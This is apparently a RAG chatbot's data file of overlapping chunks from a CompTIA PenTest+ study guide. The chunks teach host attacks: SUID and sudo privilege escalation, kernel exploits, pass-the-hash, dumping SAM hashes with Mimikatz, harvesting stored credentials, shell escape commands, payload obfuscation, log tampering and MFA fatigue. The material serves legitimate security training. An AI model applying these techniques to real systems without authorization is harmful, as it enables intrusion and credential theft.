Integrated Scripting Environment (ISE) PsExec Evil‐WinRM Living off the land binaries (LOLbins) 4.6 Given a scenario, perform cloud‐based attacks using the appropriate tools. Attack Types Metadata service attacks Identity and access management misconfigurations Third‐party integrations Resource misconfiguration Network segmentation Network controls Identity and access management (IAM) credentials Exposed storage buckets Public access to services Logging information exposure Image and artifact tampering Supply chain attacks Workload runtime attacks Container escape Trust relationship abuse Tools Pacu Docker Bench Kube‐hunter Prowler ScoutSuite Cloud‐native vendor tools 4.9 Explain common attacks against specialized systems. Attack Types Mobile attacks Information disclosure Jailbreak/rooting Permission abuse AI attacks Prompt injection Model manipulation OT Register manipulation CAN bus attack Modbus attack Plaintext attack Replay
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scenario, perform cloud‐based attacks using the appropriate tools. Attack Types Metadata service attacks Identity and access management misconfigurations Third‐party integrations Resource misconfiguration Network segmentation Network controls Identity and access management (IAM) credentials Exposed storage buckets Public access to services Logging information exposure Image and artifact tampering Supply chain attacks Workload runtime attacks Container escape Trust relationship abuse Tools Pacu Docker Bench Kube‐hunter Prowler ScoutSuite Cloud‐native vendor tools 4.9 Explain common attacks against specialized systems. Attack Types Mobile attacks Information disclosure Jailbreak/rooting Permission abuse AI attacks Prompt injection Model manipulation OT Register manipulation CAN bus attack Modbus attack Plaintext attack Replay attack Near‐field communication (NFC) Bluejacking Radio‐frequency identification (RFID) Bluetooth spamming Tools Scapy tcprelay Wireshark/tcpdump MobSF Frida Drozer Android Debug Bridge (ADB) Bluecrack Penetration testers need to be able to gain access to a wide variety of systems and devices. There are a multitude of methods that can be used to attack authentication mechanisms, individual hosts, specialized systems, and cloud technologies. Exploiting operating system and application vulnerabilities, misconfigured services and default settings, privilege escalation attacks, and service exploits are all common techniques used by penetration testers to gain access to systems. Once you have gained a foothold, your next step will typically be to explore the access you have gained and leverage it to increase your access or gain more access by cracking passwords. You may also choose to hide your tracks or to ensure that you have remote access using a variety of remote access tools. In this chapter, you will learn about specific exploit methodologies and vulnerabilities for devices and systems, including cloud environments and services and specialized systems like mobile, Internet of Things (IoT), operational technology (OT) environments, industrial control systems (ICSs), and virtualized environments. You will also explore techniques that you can use to attack data storage systems and management interfaces, how to attack mobile devices, and the basics of attacking containers and virtual machines to exploit the systems that run them. Finally, you will learn how to acquire credentials from common credential store locations and how to leverage powerful password recovery tools to crack hashed passwords quickly from common password formats. Real World Scenario Scenario Part 1: Attacking a Cloud‐Hosted System You have completed most of the tasks outlined in the scope of work agreement you signed with MCDS. Now it is time to compromise hosts based on the information you gained through your information gathering, reconnaissance, and other activities. You know that MCDS makes use of both on‐premises and cloud‐hosted infrastructure as a service systems based on résumés and forum postings from system administrators that you have found during your OSINT gathering. As you read this chapter, consider how you would answer the following questions as part of your penetration test planning and preparation: 1. What methods would you use to get access to a Linux system that was hosted in a cloud environment? 2. How could you conduct a credential harvesting attack to gain access to systems? 3. What types of misconfigurations are most
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	reconnaissance, and other activities. You know that MCDS makes use of both on‐premises and cloud‐hosted infrastructure as a service systems based on résumés and forum postings from system administrators that you have found during your OSINT gathering. As you read this chapter, consider how you would answer the following questions as part of your penetration test planning and preparation: 1. What methods would you use to get access to a Linux system that was hosted in a cloud environment? 2. How could you conduct a credential harvesting attack to gain access to systems? 3. What types of misconfigurations are most common for cloud systems, and how could you leverage each? 4. What implications does a containerized environment have for your penetration testing efforts? 5. What concerns should you address with your client before conducting a penetration test involving cloud‐hosted systems or services? This scenario continues in Part 2 later in this chapter. Attacking Hosts Throughout this book, you have learned exploitation techniques that target applications and services, along with a variety of attack methods, ranging from network‐centric attacks to social‐engineering staff members at your target organization. Now you have arrived at the last set of major exploit target: individual systems, specialized systems, and cloud technologies. Successfully attacking these targets often relies on a combination of the techniques you have learned in this book. First, you need to know the type of system you are targeting and any vulnerabilities it may have. Then you can determine the attack techniques and exploits that are most likely to succeed. Unfortunately, once you find your way past a host's security protections, you will often find yourself in an account or service with limited privileges. That means that escalating privileges and gathering additional information like user IDs and hashed passwords, as well as exploring systems for poorly secured, mismanaged, or default configurations and employing a variety of other attacks, all need to be in your arsenal if you are to be truly successful when attacking hosts. Throughout this chapter, remember that even the largest compromises often start with a relatively small crack in the armor of a target organization. A single poorly secured system, device, or service can provide a foothold from which you can pivot to a different security zone may be all you need to succeed with your penetration testing goals! We'll start off the chapter looking at common methods of attacking hosts that run a variety of common operating systems since the basic concepts and techniques used for them often carries over to the cloud technologies and specialized systems the PenTest+ exam focuses on. The PT0‐003 exam objectives don't have a lot to say about traditional host‐based attacks through the lens of the operating system itself. Instead, it breaks things down into authentication attacks, network and wireless attacks, application‐based attacks, AI attacks, OT attacks, cloud technology attacks, and attacks against specialized systems. That doesn't mean you can't think about common attacks against Linux or Windows systems—but it does mean that you should
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that run a variety of common operating systems since the basic concepts and techniques used for them often carries over to the cloud technologies and specialized systems the PenTest+ exam focuses on. The PT0‐003 exam objectives don't have a lot to say about traditional host‐based attacks through the lens of the operating system itself. Instead, it breaks things down into authentication attacks, network and wireless attacks, application‐based attacks, AI attacks, OT attacks, cloud technology attacks, and attacks against specialized systems. That doesn't mean you can't think about common attacks against Linux or Windows systems—but it does mean that you should remember that the PenTest+ exam outline categorizes them by the attack type, target, and method such as a tool, not by the OS or service involved. We'll still explore some common techniques here because they're foundational knowledge for the topics covered on the exam, and techniques for what the PenTest+ exam outline calls “specialized systems” often rely on these concepts and techniques. Linux Linux comes in a broad variety of flavors, from corporate‐oriented distributions like Red Hat Enterprise Linux to embedded systems in specialized hardware like Internet of Things (IoT) devices as well as cloud platforms with their own Linux versions like Amazon Linux. Each distribution and release may behave differently, with different directory structures, configurations, and kernels, among other things. That complexity means that Linux systems can be harder to secure for defenders in a large, diverse environment, but it also means that you will have to be more aware of the differences between Linux versions when you work with them. Fortunately, for the purposes of the PenTest+ exam, you can largely focus on common vulnerabilities, exploits, and attack methods that are shared by most modern Linux systems, including cloud hosts, embedded systems, and IoT devices. As you read through the following pages, bear in mind the differences that you may find between distributions and specialized versions of Linux and remember that your intelligence gathering may need to include version‐specific vulnerability and attack research in addition to more typical information‐gathering activities. SUID/SGID Programs The set user ID (SETUID, or SUID) and set group ID (GUID) bits tell Linux that the executable file they are set for should be run as the owner of the file, not as the user who launched it. Finding these on a Linux system is easy if you are root; you can simply use the find command: find / -perm -4000 This command shows all SUID files and folders. Setting the UID and GID (user ID and group ID) bits is also easy to do with chmod by issuing the u+s or g+s flags, and removing them just requires using u‐s or g‐s as appropriate. SUID would be even more powerful if it worked on scripts, but most system kernels are configured to prevent scripts from allowing SETUID to work. This is because the scripts are considered dangerous, and the shebang, or #!, at the start of a script can be abused by attackers (and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	find command: find / -perm -4000 This command shows all SUID files and folders. Setting the UID and GID (user ID and group ID) bits is also easy to do with chmod by issuing the u+s or g+s flags, and removing them just requires using u‐s or g‐s as appropriate. SUID would be even more powerful if it worked on scripts, but most system kernels are configured to prevent scripts from allowing SETUID to work. This is because the scripts are considered dangerous, and the shebang, or #!, at the start of a script can be abused by attackers (and penetration testers!) to gain greater access. Quite a few common Linux executables can be used for privilege escalation if SUID permission is set. These include cp, find, the Bash shell, more and less, editors like vim and nano, and even older versions of Nmap. Just finding these applications on a system doesn't guarantee that you'll be able to exploit them, so make sure you look for the SUID or GUID bits. Figure 10.1 shows a listing of SUID files in Kali Linux. The list of executables containing SUID and GUID bits will vary from distribution to distribution, and systems may gather more over time if the administrator isn't careful. FIGURE 10.1 SUID files in Kali Digging deeper, you can see what this listing looks like with more detail in Figure 10.2. Note the s flag set for each file that we previously listed with the quick search. FIGURE 10.2 SUID files with details Each of these executables might be a potential attack vector, but if you discovered find, Bash, less, or more, or another application that needs to write arbitrary data or execute other files, you are more likely to successfully exploit the SETUID application. Privilege escalation is an attack allowing for the elevated access of user accounts and what they are authorized to do based on exploitation of weak security controls and various other methods such as exploitation of misconfigurations and malware. Another helpful tool to conduct privilege escalation is Seatbelt.exe, which is part of the GhostPack suite of tools and is available at https://github.com/GhostPack/Seatbelt. Seatbelt is a toolset that will allow you to test a Windows host and collect data that can help you conduct privilege escalation checks, store the data, or output to a file and help you assess the security posture of the host(s) scanned. Unsecure SUDO The Linux Super User Do, or sudo, command allows users to escalate their privileges based on settings found in the sudoers file (typically found in /etc). When the sudo command is called, the sudoers file is checked and rights are granted if they are permitted. You should always review the sudoers file of a system after you gain access to it to figure out which accounts you may want to target and what rights they have. You may be surprised at what rights have been granted to specific users, particularly in environments where policies are not strictly enforced and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	SUDO The Linux Super User Do, or sudo, command allows users to escalate their privileges based on settings found in the sudoers file (typically found in /etc). When the sudo command is called, the sudoers file is checked and rights are granted if they are permitted. You should always review the sudoers file of a system after you gain access to it to figure out which accounts you may want to target and what rights they have. You may be surprised at what rights have been granted to specific users, particularly in environments where policies are not strictly enforced and access rights are not regularly reviewed. If you can identify and compromise a sudo‐capable user account that can run a program as root, you may be able to use that access to run a shell as root. Access to run Python or Perl as root is sometimes required for scripts on a system, and an otherwise low‐privileged account may have this capability. In Figure 10.3, a user named sudodemo with permission to run Perl as root has opened a Bash shell using those rights. FIGURE 10.3 Abusing sudo rights Even seemingly innocent permissions to run files can allow this type of escalation. Raj Chandel provides a long list of ways to abuse sudo rights at https://www.hackingarticles.in/linux‐privilege‐escalation‐using‐exploiting‐ sudo‐rights. Rights as well as permission abuse is a big problem for administrators looking to keep their administrative rights and permission protected. Once an attacker gains access to protected accounts and can manipulate them, the abuse can begin! Once the attacker can manipulate the accounts on any machine, whether it be on Linux or Windows as examples, they are able to conduct other attacks such as turning off protection, disabling services, or even disabling tools so they can hide their activity or maintain a foothold through persistence. A common attack (or step taken) after permission abuse is the disabling of tools that may identify such abuse. If an attacker has access to the root or sudo accounts, next steps generally are to turn off any tools or services to protect themselves and hide activity. A great article on impairing defenses and disabling or modifying tools can be found on MITRE at https://attack.mitre.org/techniques/T1562/001. We talked more about upgrading restricted shells in Chapter 6, “Exploit and Pivot.” Shell Upgrade Attacks Some Linux systems use restricted shells to keep users in a secure sandbox. Restricted shells limit the commands or applications that can be used. Common examples are found in the Bash shell using rbash or bash ‐r, in the Korn shell using rksh or ksh ‐r, and in the Bourne shell and similar shells using sh ‐r or rsh. Restricted shells commonly prevent users from changing directories, setting PATH or SHELL variables, specifying absolute pathnames, and redirecting output. Some may even add additional limitations, which can be frustrating when attempting to compromise a targeted host from a restricted account! For more details on how to break out of restricted shells, visit https://fireshellsecurity.team/restricted‐linux‐shell‐escaping‐techniques. Fortunately, breaking out of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the commands or applications that can be used. Common examples are found in the Bash shell using rbash or bash ‐r, in the Korn shell using rksh or ksh ‐r, and in the Bourne shell and similar shells using sh ‐r or rsh. Restricted shells commonly prevent users from changing directories, setting PATH or SHELL variables, specifying absolute pathnames, and redirecting output. Some may even add additional limitations, which can be frustrating when attempting to compromise a targeted host from a restricted account! For more details on how to break out of restricted shells, visit https://fireshellsecurity.team/restricted‐linux‐shell‐escaping‐techniques. Fortunately, breaking out of restricted shells can be as simple as starting a new unrestricted shell or using a utility like vi that has a built‐in shell function to escape the restricted shell. In general, when you are confronted with a restricted shell, you should do the following: Check the commands you can run, particularly looking for SUID commands. Check to see if you can use sudo and what sudo commands you can execute. Check for languages like Perl, Python, or Ruby that you can run. Check to see if you can use redirect operators like | or > and escape characters like single quotes, double quotes, or other execution tags. Linux Kernel Exploits The Linux kernel is the core of the Linux operating system, and it handles everything from input and output, memory management, and interfacing with the processor to interfacing with peripherals like keyboards and mice. Exploiting the kernel can provide powerful access to a system, making Linux kernel exploits a favorite tool of pentesters (and other attackers!) when they can be conducted successfully. The CVE list (https://cve.mitre.org) classifies Linux kernel exploits based on the type of vulnerability, with categories for denial‐of‐service, code execution, overflow, memory corruption, directory traversal, bypass, information leakage, and privilege escalation vulnerabilities, all seen in the kernel over time. Denial‐of‐service attacks are the most common type of exploit, but they are the least interesting to most pentesters. As you might expect, code execution, privilege elevation, and bypass attacks are most likely to be useful to pentesters. You can practice kernel exploits against the Metasploitable virtual machine. In fact, gaining access to an unprivileged account and then using a kernel exploit to gain root access is a great exercise to try as you are practicing your Metasploit skills. In the majority of cases, the most critical Linux kernel exploits require local access to the system, meaning that taking advantage of them will require you to have previously gained access to the system. The difficulty of executing kernel exploits and the fact that most kernel patches will require a system reboot also mean that many administrators will delay kernel patches. This provides an opportunity for pentesters who can gain access to a system, since kernel exploits may not be patched due to a lower perceived risk. A quick check that you can use to test a Linux system for potential kernel issues can be conducted by first checking the operating
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	require local access to the system, meaning that taking advantage of them will require you to have previously gained access to the system. The difficulty of executing kernel exploits and the fact that most kernel patches will require a system reboot also mean that many administrators will delay kernel patches. This provides an opportunity for pentesters who can gain access to a system, since kernel exploits may not be patched due to a lower perceived risk. A quick check that you can use to test a Linux system for potential kernel issues can be conducted by first checking the operating system release using lsb_release ‐a and then checking the kernel version using uname ‐a. These two simple commands can provide quick insight into what Linux distribution and kernel version are in use, as shown in Figure 10.4. FIGURE 10.4 Checking Linux kernel version information Real World Scenario Scenario Part 2: Using Harvested Credentials After successfully conducting a credential harvesting attack, you've gathered a dozen different user accounts and passwords that may be usable in the MCDS cloud environment. Now that you have multiple valid usernames and passwords to use, you must consider your next steps: 1. Do the credentials you recover allow you to log into Linux workstations or embedded devices? 2. What attacks or techniques could you use to capture additional credentials from a Linux system? What about a Windows system? 3. What tools could you use to provide ongoing remote access to the Windows systems you have compromised? What would you use for Linux systems? 4. What techniques can you use to determine if the Windows and Linux systems you have gained access to are virtual machines? 5. What should you note in your report if you discover that they are virtual machines or containers? Is it worth your time to attempt VM escape techniques? Windows Windows systems continue to make up a majority of corporate workstations and a significant number of servers in many environments. That means that a successful pentester needs to know a broad range of common attack and exploit techniques and methods for Windows systems. Just as with the Linux systems you've learned how to target, skills for obtaining passwords and targeting Windows‐specific vulnerabilities must be in your toolkit. An example of a good tool in your toolkit is when earlier you learned about LinPEAS,which helped find targets for privilege escalation. Similarly, the Windows version of this tool is WinPEAS (Windows Privilege Escalation Awesome Scripts), found here: https://github.com/peass‐ng/PEASS‐ ng/tree/master/winPEAS. Obtaining Credentials Although there are many ways to attack Windows systems, the PenTest+ exam specifically targets a few major tools and techniques for test takers. You should be familiar with each of these common targets as well as the typical methods for harvesting credentials from them using Metasploit or similar tools. Acquiring and Using Hashes Windows frequently relies on NT LAN Manager (NTLM) password hashes for authentication purposes, and tools like Mimikatz can make retrieving hashes relatively trivial. NTLM hashes are unsalted, meaning that you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	version of this tool is WinPEAS (Windows Privilege Escalation Awesome Scripts), found here: https://github.com/peass‐ng/PEASS‐ ng/tree/master/winPEAS. Obtaining Credentials Although there are many ways to attack Windows systems, the PenTest+ exam specifically targets a few major tools and techniques for test takers. You should be familiar with each of these common targets as well as the typical methods for harvesting credentials from them using Metasploit or similar tools. Acquiring and Using Hashes Windows frequently relies on NT LAN Manager (NTLM) password hashes for authentication purposes, and tools like Mimikatz can make retrieving hashes relatively trivial. NTLM hashes are unsalted, meaning that you can frequently crack NTLM hashes to retrieve user passwords—but why bother if you don't actually need the password and can simply use the hash itself by presenting it to a service? Pass‐the‐hash attacks rely on injecting hashes into Local Security Authority Subsystem Service (LSASS) or presenting NTLM hashes to services like Server Message Block (SMB) or Windows Management Instrumentation (WMI). This is made easier by the fact that the Sysinternals psexec tool can directly accept an NTLM hash as an argument instead of a password. Also note that there are two other attacks that are important to remember: the pass‐the‐ticket attack and the pass‐the‐token attack, both of which will be further explained in the section “Authentication Attacks,” later in this chapter. You can learn more about how to conduct this type of attack using Metasploit at https://www.offensive‐security.com/metasploit‐ unleashed/psexec‐pass‐hash. LSA Secrets The LSA secrets Registry location, HKEY_LOCAL_MACHINE/Security/Policy/Secrets, contains the password of the logged‐in user in an encrypted form, but the encryption key is stored in the parent policy key in the Registry. If you gain administrative access to the Registry, you can recover both the encrypted password and its key with ease. SAM Database The Windows Security Accounts Manager (SAM) database is one of the first places that you are likely to target when you gain access to a Windows system. The SAM contains password hashes that can be easily dumped using Mimikatz or the Mimikatz functionality built into Metasploit, as shown in Figure 10.5. Note that first debugging was set, then privileges were escalated to the NT Authority/System, and finally the SAM was dumped. Without appropriate privileges, this process will not work! FIGURE 10.5 Dumping the Windows SAM with Mimikatz Windows Kernel Exploits Much like Linux, the Windows kernel can be attacked to gain high‐level access to Windows systems. Metasploit's post/windows/gather/enum_patches module will list any missing patches, which you can then reference against vulnerability databases to determine if an exploit exists for the unpatched issue. Metasploit also has exploit modules for many of the Windows kernel exploits discovered over time, allowing you to assess flaws and then attempt to exploit them once you have access to the system. Kernel flaws have been found in every version of Windows desktop and server operating systems. As we saw with Linux kernel exploits, most Windows kernel exploits also require local access to the system to exploit, making Windows kernel exploits most useful after
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	post/windows/gather/enum_patches module will list any missing patches, which you can then reference against vulnerability databases to determine if an exploit exists for the unpatched issue. Metasploit also has exploit modules for many of the Windows kernel exploits discovered over time, allowing you to assess flaws and then attempt to exploit them once you have access to the system. Kernel flaws have been found in every version of Windows desktop and server operating systems. As we saw with Linux kernel exploits, most Windows kernel exploits also require local access to the system to exploit, making Windows kernel exploits most useful after you have already gained access to the system. Windows Unquoted Service Path Injection Injection attacks can take advantage of system vulnerabilities by inserting code into areas that may act as legitimate services like dynamic link libraries (DLLs). With an unquoted service path injection, this attack takes advantage of a Windows system vulnerability where the system uses paths that are written a specific way and will have spaces within them. To solve this problem of the spaces being seen as an end portion of the path, you can use quotation marks on either side of the path, so any spaces or gaps are read as “spaces.” Because of this functionality, attackers can take advantage of any services installed using paths that do not have a quote (unquoted) and then execute threats based on that vulnerability. Cross‐Platform Exploits Although many host exploits only work on specific applications or operating systems, some flaws work on almost all systems. The most common exploits are those that focus on multiplatform applications, configuration issues like unsecure file or folder permissions, data harvesting opportunities found in configuration files, default account settings, and both physical and software keyloggers. Unsecure File/Folder Permissions As a pentester, you will often find that carefully reviewing the filesystem of a computer to which you have gained access will provide useful information. User‐managed filesystems are an easy place to find misconfigured permission structures or files and folders whose access rights are overly broad. System administrators aren't immune to this problem, either. In fact, the first step that many administrators take in troubleshooting is to remove restrictive permissions, and remembering to put them back in place, or putting them back in place properly, is often difficult. Although searching for directories in Linux using ls and then using grep on the output to search for weak permissions is easy, searching for poor file permissions in Windows may initially seem more difficult. Fortunately, the AccessEnum and Accesschk Sysinternals tools can provide easy‐to‐review reports. PowerShell's Get‐Acl command can provide detailed information, and the icacls command shows details of how permissions' inheritance will work on a given file or folder. Stored Credentials In addition to the credentials that operating systems store, many third‐party software packages store credentials that you may be able to retrieve. Examples include VNC tools like UltraVNC and RealVNC, both of which store passwords on the local system. PuTTY, the popular SSH client, stores proxy credentials
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	permissions is easy, searching for poor file permissions in Windows may initially seem more difficult. Fortunately, the AccessEnum and Accesschk Sysinternals tools can provide easy‐to‐review reports. PowerShell's Get‐Acl command can provide detailed information, and the icacls command shows details of how permissions' inheritance will work on a given file or folder. Stored Credentials In addition to the credentials that operating systems store, many third‐party software packages store credentials that you may be able to retrieve. Examples include VNC tools like UltraVNC and RealVNC, both of which store passwords on the local system. PuTTY, the popular SSH client, stores proxy credentials in cleartext in the Windows Registry under HKCU/Software/SimonTatham/Putty/Sessions, and user bad habits mean that even if there's not a technical flaw exposing credentials you may find them in a file, in an unlocked password manager, or saved in a browser. All of this means that it may be worth performing a quick search to see if the software installed on a system you have gained access to has a known credential leakage problem. Default Account Settings Almost every installation or setup guide written for modern systems recommends changing default account settings. Despite this fact, pentesters consistently discover systems, devices, and applications that continue to have default accounts set up with their original passwords. Default password lists like those found at https://www.defaultpassword.us, https://cirt.net/passwords, and many other sites provide an easy way to quickly look up default usernames and passwords for many common network devices and software packages. The actual settings for accounts are also often left unchanged. That means that some accounts may have greater permissions than they need to serve their intended purpose. After you check for default username and password combinations, you may also want to validate the rights that individual users have—after all, it is usually far more innocuous to take over a user account with administrative privileges than to take over root or the administrator account on the system, device, or service! Misconfigured Endpoints Likely to occur on any type of platform is the problem with misconfigured endpoints. Misconfigured endpoints pretty much span the gamut—there are literally an endless amount of endpoints in technology today. Endpoints are classified as devices and systems that are focused on the end users who use them. They can be desktops, laptops, mobile phones, mobile devices like pads, and anything else that is connected to a wired or wireless network and is not deemed to be infrastructure. Endpoints are often used by users, which means that they are supposed to be useful. That means they are likely to have a great many applications and services installed on them for use. Because of this, there are many things that can be misconfigured and cause vulnerabilities to exist. This can be security settings in general, firewall and antivirus management misconfigurations, application misconfiguration, and so on. This can lead to many exploits, and as mentioned before, thinking exponentially on how many endpoints do exist and how many services run on them, there can be many
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	not deemed to be infrastructure. Endpoints are often used by users, which means that they are supposed to be useful. That means they are likely to have a great many applications and services installed on them for use. Because of this, there are many things that can be misconfigured and cause vulnerabilities to exist. This can be security settings in general, firewall and antivirus management misconfigurations, application misconfiguration, and so on. This can lead to many exploits, and as mentioned before, thinking exponentially on how many endpoints do exist and how many services run on them, there can be many misconfigurations present that must be identified. Payload Obfuscation Payload obfuscation is the hiding of a payload so it cannot be immediately identified or found. This can occur on any platform when deployed. The payload of an attack can be slightly modified so that tools cannot pick it up on routine scans. If undetected, the payload remains active and, because it escaped detection, can be used or deployed. The common methods used for obfuscation is either through changes in compression, encryption, or encoding of the code. Another way payloads can be obfuscated is through the chopping up of one larger file into separate smaller ones that only when assembled will reveal the malcode. Although you may not come across this toolset and framework on the PenTest+ exam, a common tool used for this functionality is called NSGenCS. It is labeled as an extendable payload obfuscation and delivery framework and can be found at https://github.com/t3hbb/NSGenCS. User‐Controlled Access Bypass User‐controlled access bypass is a long jumble of words that stand for the bypass of access controls that are controlled by a user. So, if you consider what access controls may be in place, let's first start with simple files and folders found on any given workstation in use today. If, for example, a folder was secured from anyone else but the owner of the folder to modify but others are allowed to view it, then a simple hack would be to conduct permissions abuse, or escalation of access rights of the folder and change the access control settings available for it. Or another attack could be to use a privileged account that has been accessed maliciously to change the controls and allow access. There are obviously more complicated forms of this attack such as using different methods of the attack found in MITRE's Common Weakness Enumeration (CWE) Authorization Bypass Through User‐Controlled Key found at https://cwe.mitre.org/data/definitions/639.html. Shell Escape Shell escape occurs on shells that are the front end of the operations system you may be using. Yes, shells can be accessed from text editors and other toolsets, but to keep this relatively easy to understand for the PenTest+ exam, consider a Linux shell like Bash would be in use and as a pentester, you would want to see how easy it may be to conduct a shell escape. Why is a shell escape bad? Shells escape should be kept to only the most privileged
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Common Weakness Enumeration (CWE) Authorization Bypass Through User‐Controlled Key found at https://cwe.mitre.org/data/definitions/639.html. Shell Escape Shell escape occurs on shells that are the front end of the operations system you may be using. Yes, shells can be accessed from text editors and other toolsets, but to keep this relatively easy to understand for the PenTest+ exam, consider a Linux shell like Bash would be in use and as a pentester, you would want to see how easy it may be to conduct a shell escape. Why is a shell escape bad? Shells escape should be kept to only the most privileged accounts such as sudo or root. A common command seen to conduct a shell escape is :! /bin/bash If you are able to conduct a shell escape, then you have proven that the shell is not restricted, or you are in fact using privilege accounts to do it. Kiosk Escape Kiosk escape occurs when you are testing the security of a machine functioning in kiosk mode. Normally, a system that is running in kiosk mode is very limited to what it can do for the purpose of providing a secure platform to work on and only providing the functionality required to do the tasks that the kiosk is allowed to do. An example of this may be a publicly accessible computer in a general area with a web browser available for general Internet access. Kiosk mode allows the system to provide this functionality to the end users who can access it. Escaping this mode requires a series of attack methods, including privilege escalation, abuse, and bypass and escape of access constraints or controls. Although used across many OS types, if you were running a Windows system, you can at times reboot the system to gain access to it and get around Kiosk mode. Although that is a simple trick, dozens of available work‐arounds and hacks to bypass this control can be found here: https://book.hacktricks.xyz/hardware‐physical‐access/escaping‐from‐gui‐ applications. Library Injection Although common to Windows, what makes library injection attacks cross‐ platform is that they can also take place on mobile devices as well that often use libraries. You will learn more about mobile attacks in the section “Attacking Mobile Devices,” later in this chapter, but for now, remember that Frida is an injection tool that can be used to inject JavaScript code or other libraries into native applications for both mobile (Android and iOS) and other operating systems like Windows and macOS. Tools like Frida can be used to intercept and modify JavaScript responses in applications to bypass input requirements or even authentication processes, as well as for other tasks where injecting your own code or responses may be useful. It also supports multiple languages like Python, .NET, Swift, and C. The most common form of library injection comes from Windows and its DLLs. A library injection attack on Windows will take place when an attacker injects a library or a DLL into a process so that they can either evade any defenses
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	iOS) and other operating systems like Windows and macOS. Tools like Frida can be used to intercept and modify JavaScript responses in applications to bypass input requirements or even authentication processes, as well as for other tasks where injecting your own code or responses may be useful. It also supports multiple languages like Python, .NET, Swift, and C. The most common form of library injection comes from Windows and its DLLs. A library injection attack on Windows will take place when an attacker injects a library or a DLL into a process so that they can either evade any defenses in place or execute arbitrary code when making an API call as an example. An example of this is found on MITRE, where a tool such as ComRAT will inject a DLL into explorer.exe (the Windows shell or file manager) or the default web browser to begin C2 connections and they do not look malicious because they appear to be coming from a system process. You can learn more about this attack here: https://attack.mitre.org/software/S0126. Process Hollowing and Injection As we just covered with library injection, another attack comes in the form of process hollowing. Other names for this attack are module stomping, overloading, or DLL hollowing. As you just learned with library injection, malware or malcode can be concealed through injection within a process, and this allows attackers to hide their malicious code with a legitimate file (like a DLL) to mask its intentions. Because it's masked, it could thwart security systems and antivirus programs that may overlook it as legitimate. Log Tampering Log tampering can take place on any platform. Logs are pretty much kept on just about any and every system you can think of. Now, logging can be turned off or limited, and in some cases, it can be expanded upon and made extremely verbose! In some instances, logs can be sent from one system to another, kept in a monitoring tool, a database, or in storage. Regardless of point of origin or what the destination is, the log itself is the target. Log tampering is just what it sounds like—an attacker gaining access to a log and tampering with it. The log can be replaced, deleted, changed, or altered. Log tampering is often done to hide the attackers' tracks. If an attack or breach takes place, there may be a log of it somewhere. If the attacker knows where to look, they can hide their tracks by altering the log. Credential Attacks and Testing Tools Throughout this book, we have discussed a variety of methods of attacking passwords and gathering credentials. Attacking hosts, applications, and devices can involve a number of credential attack schemes. It is also important to note that attacks against credentials also lead to performing authentication attacks. Once a host, as well as its credentials, have been compromised, a variety of ongoing attacks may take place, including authentication attacks. Let's start by discussing the type of authentication attacks that can take place and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacker knows where to look, they can hide their tracks by altering the log. Credential Attacks and Testing Tools Throughout this book, we have discussed a variety of methods of attacking passwords and gathering credentials. Attacking hosts, applications, and devices can involve a number of credential attack schemes. It is also important to note that attacks against credentials also lead to performing authentication attacks. Once a host, as well as its credentials, have been compromised, a variety of ongoing attacks may take place, including authentication attacks. Let's start by discussing the type of authentication attacks that can take place and learning how to acquire credentials through harvesting, dumping, and other methods. Authentication Attacks Authentication attacks are extremely common and are an important part of pentesting. Being aware of vulnerabilities in this focus area is incredibly important to increase the security posture of any organization. It's actually part of an authentication and authorization series of attacks where first you must authenticate to a system to use it, but then be authorized by the system to be granted access to do things. What you are able to do once the process is completed is based on who you are and what your credentials say you can do. The first way to get into a system maliciously is to subvert the process of authentication. These types of attacks are generally coined “identity threats” because it's your identity that is at times allowing you to authenticate. There are many ways to authenticate. You can access a system and log into it with credentials. You can use biometrics. You can use a series of hardware devices to provide authentication methods. Multifactor Authentication (MFA) Attacks One of the ways that authentication is protected is with multifactor authentication (MFA). MFA can be provided by first requiring you to input your username and password (credentials) into the target system, which is the first factor. Then, the system asks you to do something else such as verifying your identity through a text message, sending you a code and verifying that you received it (second factor). This two‐factor authentication method has proved to be very successful in adding in a much‐needed layer of security so that if your credentials are ever compromised, at least you have a second chance to stop a breach. There are of course ways to beat MFA. Multifactor authentication fatigue is a way to attack MFA and an attempt to bypass that second factor of security. This is also sometimes called MFA spamming or MFA bombing. The way this attack works is by sending many MFA requests to the second factor devices, which in the example I provided would be the user's mobile phone to verify with a provided code. A bogus link is placed in many of these requests with the hope that the unsuspecting user clicks on it and follows through with the verification on the link. Other attacks can take place, such as session stealing or token theft, as well as adversary‐in‐the‐middle (AiTM)
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and an attempt to bypass that second factor of security. This is also sometimes called MFA spamming or MFA bombing. The way this attack works is by sending many MFA requests to the second factor devices, which in the example I provided would be the user's mobile phone to verify with a provided code. A bogus link is placed in many of these requests with the hope that the unsuspecting user clicks on it and follows through with the verification on the link. Other attacks can take place, such as session stealing or token theft, as well as adversary‐in‐the‐middle (AiTM) phishing attacks. All of these are leveraged to thwart security in place to protect authentication processes. Another similar type of authentication attack is a pass‐the‐hash attack. Pass‐ the‐hash attacks, as we covered earlier in the chapter, rely on injecting hashes into LSASS or presenting NTLM hashes to services like SMB or WMI. This is made easier by the fact that the Sysinternals psexec tool can directly accept an NTLM hash as an argument instead of a password. Another method can be to use the same hash attack against tickets or tokens. This type of attack will allow an attacker to steal a hashed credential and use it to create a new user session. If the hash is known, it can create new sessions without issue. The hash is generally a one‐way function that mathematically will take a password and create a text string that is indecipherable. Pass‐the‐ticket and pass‐the‐token attacks are used in a similar fashion. Both take either a ticket or token and conduct the same method of using it to create a new session. Ticket issues are based on Kerberos, which has its own 